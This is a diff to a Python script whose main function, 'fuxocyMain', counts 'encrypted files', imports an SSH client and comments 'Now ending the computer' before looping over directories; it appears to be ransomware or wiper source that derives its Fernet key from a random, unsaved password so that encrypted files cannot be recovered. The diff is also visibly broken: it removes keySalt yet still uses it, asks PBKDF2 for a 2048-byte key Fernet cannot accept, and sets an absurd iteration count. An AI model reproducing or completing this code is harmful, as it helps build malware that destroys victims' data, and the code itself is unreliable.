@@ -5,10 +5,16 @@ import socket
 import subprocess
 import uuid
 import base64
+from cryptography.fernet import Fernet
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from paramiko import SSHClient
+
+def randomString(stringLength=128):
+    """Generate a random string of fixed length """
+    letters = string.ascii_lowercase
+    return ''.join(random.choice(letters) for i in range(stringLength))
 
 #Pre-programmed functions to be declared here
 def fuxocyMain():
@@ -23,21 +29,17 @@ def fuxocyMain():
     #Global variables for encrypted files
     encryptedFiles = 0
 
-    keySalt = uuid.uuid4().hex
-    masterKey = Fernet.generate_key()
-
-    f = Fernet(key)
-
-    password = masterKey.encode() # Convert to type bytes
+    password = randomString()
     salt = keySalt.encode()
     kdf = PBKDF2HMAC(
         algorithm=hashes.SHA512(),
         length=2048,
         salt=salt,
-        iterations=100000,
+        iterations=100000000000,
         backend=default_backend()
         )
     key = base64.urlsafe_b64encode(kdf.derive(password))
+    f = Fernet(key)
 
     #Now ending the computer
     for x in range(0,dirs.count()):
